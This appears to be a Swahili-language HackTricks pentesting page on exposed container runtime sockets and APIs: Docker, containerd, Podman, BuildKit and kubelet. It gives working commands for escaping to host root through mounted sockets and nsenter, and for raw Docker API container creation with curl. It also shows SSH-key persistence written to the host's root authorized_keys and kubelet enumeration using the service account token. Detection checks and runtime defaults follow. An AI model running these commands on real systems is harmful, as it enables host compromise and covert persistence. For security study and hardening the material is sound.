# API ya Runtime na Uwekaji Wazi wa Daemon

{{#include ../../../banners/hacktricks-training.md}}

## Muhtasari

Compromise nyingi halisi za container hazianzi na namespace escape hata kidogo. Huanzia kwenye ufikiaji wa control plane ya runtime. Ikiwa workload inaweza kuwasiliana na `dockerd`, `containerd`, CRI-O, Podman, au kubelet kupitia Unix socket iliyomountiwa au TCP listener iliyo wazi, attacker anaweza kuomba container mpya yenye privileges bora zaidi, kumount filesystem ya host, kujiunga na host namespaces, au kupata taarifa nyeti za node. Katika hali hizo, runtime API ndiyo security boundary halisi, na kuicompromise ni karibu sawa na kuicompromise host.

Hii ndiyo sababu runtime socket exposure inapaswa kuandikwa kando na protections za kernel. Container yenye seccomp, capabilities, na MAC confinement za kawaida bado inaweza kuwa API call moja tu kutoka kwa host compromise ikiwa `/var/run/docker.sock` au `/run/containerd/containerd.sock` imewekwa ndani yake. Kernel isolation ya container ya sasa inaweza kuwa ikifanya kazi kama ilivyoundwa, huku management plane ya runtime ikiwa bado imewekwa wazi kikamilifu.

## Miundo ya Ufikiaji wa Daemon

Docker Engine kwa kawaida huweka API yake yenye privileged kupitia Unix socket ya ndani kwenye `unix:///var/run/docker.sock`. Kihistoria, pia imekuwa ikiwekwa wazi kwa mbali kupitia TCP listeners kama `tcp://0.0.0.0:2375` au listener yenye ulinzi wa TLS kwenye `2376`. Kuweka daemon wazi kwa mbali bila TLS thabiti na client authentication kunageuza Docker API kuwa remote root interface.

containerd, CRI-O, Podman, na kubelet huweka wazi surfaces zenye impact kubwa kwa njia zinazofanana. Majina na workflows hutofautiana, lakini logic haibadiliki. Ikiwa interface inamruhusu caller kuunda workloads, kumount host paths, kupata credentials, au kubadilisha containers zinazoendesha, interface hiyo ni privileged management channel na inapaswa kuchukuliwa hivyo.

Common local paths zinazostahili kuangaliwa ni:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
Stack za zamani au maalum zaidi zinaweza pia kufichua endpoints kama `dockershim.sock`, `frakti.sock`, au `rktlet.sock`. Hizi si za kawaida sana katika mazingira ya kisasa, lakini zinapopatikana zinapaswa kushughulikiwa kwa tahadhari sawa kwa sababu zinawakilisha maeneo ya udhibiti wa runtime badala ya sockets za kawaida za application.

## Secure Remote Access

Ikiwa daemon lazima ifichuliwe nje ya local socket, muunganisho unapaswa kulindwa kwa TLS na ikiwezekana kwa mutual authentication ili daemon imthibitishe client na client imthibitishe daemon. Tabia ya zamani ya kufungua Docker daemon kwa plain HTTP kwa ajili ya urahisi ni mojawapo ya makosa hatari zaidi katika usimamizi wa containers kwa sababu API surface ina uwezo wa kutosha kuunda containers zenye privileges moja kwa moja.

Mfumo wa kihistoria wa configuration ya Docker ulionekana hivi:
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
Kwenye hosts zinazotumia systemd, mawasiliano ya daemon yanaweza pia kuonekana kama `fd://`, kumaanisha kuwa mchakato hurithi socket iliyofunguliwa awali kutoka kwa systemd badala ya kuifungamanisha moja kwa moja. Somo muhimu si sintaksia halisi, bali athari ya kiusalama. Pindi daemon inaposikiliza nje ya socket ya ndani yenye ruhusa zilizodhibitiwa kwa ukali, usalama wa transport na uthibitishaji wa client huwa wa lazima badala ya kuwa hardening ya hiari.

## Matumizi mabaya

Ikiwa runtime socket ipo, thibitisha ni ipi, kama client inayooana ipo, na kama ufikiaji wa raw HTTP au gRPC unawezekana:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```
Amri hizi ni muhimu kwa sababu zinatofautisha kati ya path iliyokufa, socket iliyowekwa lakini isiyofikika, na API hai yenye privileges. Ikiwa client inafanikiwa, swali linalofuata ni ikiwa API inaweza kuzindua container mpya yenye host bind mount au kushiriki host namespace.

### Wakati Hakuna Client Iliyosakinishwa

Kutokuwepo kwa `docker`, `podman`, au CLI nyingine rafiki hakumaanishi kuwa socket iko salama. Docker Engine huzungumza HTTP kupitia Unix socket yake, na Podman hutoa API inayolingana na Docker pamoja na API ya asili ya Libpod kupitia `podman system service`. Hii inamaanisha kuwa mazingira madogo yenye `curl` pekee yanaweza bado kutosha kuendesha daemon:
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
-X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```
Hili ni muhimu wakati wa post-exploitation kwa sababu defenders wakati mwingine huondoa client binaries za kawaida lakini wakaacha management socket ikiwa mounted. Kwenye hosts za Podman, kumbuka kwamba path yenye thamani kubwa hutofautiana kati ya deployments za rootful na rootless: `unix:///run/podman/podman.sock` kwa rootful service instances na `unix://$XDG_RUNTIME_DIR/podman/podman.sock` kwa rootless ones.

### Full Example: Docker Socket To Host Root

Ikiwa `docker.sock` inaweza kufikiwa, escape ya kawaida ni kuanzisha container mpya inayomount host root filesystem, kisha kuingia ndani yake kwa kutumia `chroot`:
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
Hii hutoa execution ya moja kwa moja yenye host-root kupitia Docker daemon. Athari haiishii kwenye usomaji wa faili pekee. Baada ya kuingia kwenye container mpya, mshambuliaji anaweza kubadilisha faili za host, kukusanya credentials, kuweka persistence, au kuanzisha workloads nyingine zenye privileges.

### Mfano Kamili: Docker Socket To Host Namespaces

Ikiwa mshambuliaji anapendelea kuingia kwenye namespace badala ya ufikiaji wa filesystem pekee:
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
Njia hii hufikia host kwa kuiomba runtime itengeneze container mpya yenye host-namespace exposure iliyoainishwa wazi, badala ya kutumia vibaya ile ya sasa.

### Docker Socket Persistence Pattern

Runtime control pia inaweza kutumika kwa persistence badala ya shell ya matumizi ya mara moja. Muundo wa jumla ni kuunda container ya msaidizi yenye host mount, kuandika authorized access material au startup hook kwenye mfumo wa faili wa host uliowekwa, kisha kuthibitisha kuwa host inaitumia.

Muundo wa mfano:
```bash
docker -H unix:///var/run/docker.sock run -d --name helper -v /:/host ubuntu:24.04 sleep infinity
docker -H unix:///var/run/docker.sock exec helper sh -c 'mkdir -p /host/root/.ssh && chmod 700 /host/root/.ssh'
docker -H unix:///var/run/docker.sock cp ./id_ed25519.pub helper:/tmp/key.pub
docker -H unix:///var/run/docker.sock exec helper sh -c 'cat /tmp/key.pub >>/host/root/.ssh/authorized_keys'
```
Wazo hilo hilo linaweza kulenga systemd units, cron fragments, application startup files, au SSH keys kulingana na kile operator anachotaka kuthibitisha. Jambo muhimu ni kwamba mabadiliko ya kudumu yanafanywa kupitia mamlaka ya filesystem ya kiwango cha host ya runtime daemon, wala si kupitia privilege ya ziada ndani ya container ya awali.

### Raw Docker API Helper Pivot

Docker CLI inapokosekana, mtiririko huohuo wa host-mount helper unaweza kuendeshwa kupitia HTTP juu ya Unix socket. Mtiririko wa jumla ni: kuthibitisha API, kuunda helper container yenye host bind mount, kuiwasha, kuunda exec instance, na kuanzisha exec hiyo.
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["sleep","3600"],"HostConfig":{"Binds":["/:/host:rw"]}}' \
-X POST http://localhost/v1.54/containers/create?name=helper
curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.54/containers/helper/start
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["chroot","/host","id"]}' \
-X POST http://localhost/v1.54/containers/helper/exec
```
Ombi la mwisho la `/exec/<id>/start` linategemea exec ID iliyorejeshwa, lakini hoja ya usalama haitegemei mpangilio kamili wa JSON: ufikiaji wa raw API kwa Docker daemon inayoendesha kama root unatosha kuomba helper workload yenye uwezo mkubwa zaidi.

### Mfano Kamili: containerd Socket

containerd socket iliyomountiwa kwa kawaida huwa hatari vivyo hivyo:
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
Ikiwa client inayofanana zaidi na Docker ipo, `nerdctl` inaweza kuwa rahisi zaidi kuliko `ctr` kwa sababu inatoa flags zinazojulikana kama `--privileged`, `--pid=host`, na `-v`:
```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
--privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```
Athari ni host compromise tena. Hata kama tooling maalum ya Docker haipo, runtime API nyingine bado inaweza kutoa mamlaka hayo hayo ya kiutawala. Kwenye nodes za Kubernetes, `crictl` inaweza pia kutosha kwa reconnaissance na container interaction kwa sababu inawasiliana moja kwa moja na CRI endpoint.

### BuildKit Socket

`buildkitd` ni rahisi kupuuzwa kwa sababu mara nyingi watu huifikiria kama "build backend tu", lakini daemon bado ni control plane yenye privileges. `buildkitd.sock` inayoweza kufikiwa inaweza kumruhusu attacker kuendesha build steps kiholela, kukagua worker capabilities, kutumia local contexts kutoka kwenye mazingira yaliyocompromise, na kuomba entitlements hatari kama `network.host` au `security.insecure` wakati daemon ilisanidiwa kuziruhusu.

Muingiliano wa kwanza wenye manufaa ni:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```
Ikiwa daemon inakubali build requests, jaribu kubaini ikiwa insecure entitlements zinapatikana:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
--frontend dockerfile.v0 \
--local context=. \
--local dockerfile=. \
--allow network.host \
--allow security.insecure \
--output type=local,dest=/tmp/buildkit-out
```
Athari halisi hutegemea usanidi wa daemon, lakini huduma ya BuildKit ya rootful yenye entitlements zinazoruhusu mambo mengi si urahisi wa kawaida usio na madhara kwa developer. Ichukulie kama administrative surface nyingine yenye thamani kubwa, hasa kwenye CI runners na shared build nodes.

### Kubelet API Over TCP

Kubelet si container runtime, lakini bado ni sehemu ya node management plane na mara nyingi huhusishwa katika mjadala uleule wa trust boundary. Ikiwa secure port ya kubelet `10250` inaweza kufikiwa kutoka kwenye workload, au ikiwa node credentials, kubeconfigs, au proxy rights zimewekwa wazi, mshambuliaji anaweza kuorodhesha Pods, kupata logs, au kutekeleza commands kwenye node-local containers bila kugusa kamwe njia ya Kubernetes API server admission.

Anza na discovery rahisi:
```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```
Ikiwa kubelet au njia ya API-server proxy inaidhinisha `exec`, client inayoweza kutumia WebSocket inaweza kuigeuza kuwa code execution katika containers nyingine kwenye node. Hii pia ndiyo sababu `nodes/proxy` yenye ruhusa ya `get` pekee ni hatari zaidi kuliko inavyoweza kuonekana: ombi bado linaweza kufikia kubelet endpoints zinazotekeleza commands, na mwingiliano huo wa moja kwa moja na kubelet hauonekani katika Kubernetes audit logs za kawaida.

## Ukaguzi

Lengo la ukaguzi huu ni kubaini ikiwa container inaweza kufikia management plane yoyote ambayo ilipaswa kubaki nje ya trust boundary.
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```
Nini kinachovutia hapa:

- Runtime socket iliyomountiwa kwa kawaida ni primitive ya moja kwa moja ya kiutawala, si kufichua taarifa tu.
- TCP listener kwenye `2375` bila TLS inapaswa kuchukuliwa kama hali inayowezesha remote compromise.
- Environment variables kama `DOCKER_HOST` mara nyingi hufichua kuwa workload iliundwa kimakusudi kuwasiliana na runtime ya host.

## Defaults za Runtime

| Runtime / platform | Hali ya default | Tabia ya default | Udhaifu wa kawaida unaowekwa kwa mikono |
| --- | --- | --- | --- |
| Docker Engine | Unix socket ya ndani kwa default | `dockerd` husikiliza kwenye socket ya ndani na daemon kwa kawaida huendeshwa kama root | kumount `/var/run/docker.sock`, kufichua `tcp://...:2375`, TLS dhaifu au usiokuwepo kwenye `2376` |
| Podman | CLI isiyo na daemon kwa default | Hakuna daemon yenye privilege inayoendelea inayohitajika kwa matumizi ya kawaida ya ndani; API sockets bado zinaweza kufichuliwa wakati `podman system service` imewezeshwa | kufichua `podman.sock`, kuendesha service kwa upana, kutumia rootful API |
| containerd | Socket ya ndani yenye privilege | Administrative API hufichuliwa kupitia socket ya ndani na kwa kawaida hutumiwa na tooling ya kiwango cha juu | kumount `containerd.sock`, kutoa ufikiaji mpana wa `ctr` au `nerdctl`, kufichua namespaces zenye privilege |
| CRI-O | Socket ya ndani yenye privilege | CRI endpoint imekusudiwa kwa components zinazoaminika za node-local | kumount `crio.sock`, kufichua CRI endpoint kwa workloads zisizoaminika |
| Kubernetes kubelet | Management API ya node-local | Kubelet haipaswi kufikiwa kwa upana kutoka kwa Pods; ufikiaji unaweza kufichua hali ya pod, credentials na vipengele vya execution kulingana na authn/authz | kumount kubelet sockets au certs, kubelet auth dhaifu, host networking pamoja na kubelet endpoint inayofikika |

## Marejeleo

- [containerd socket exploitation part 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [Kubernetes API Server Bypass Risks](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
{{#include ../../../banners/hacktricks-training.md}}
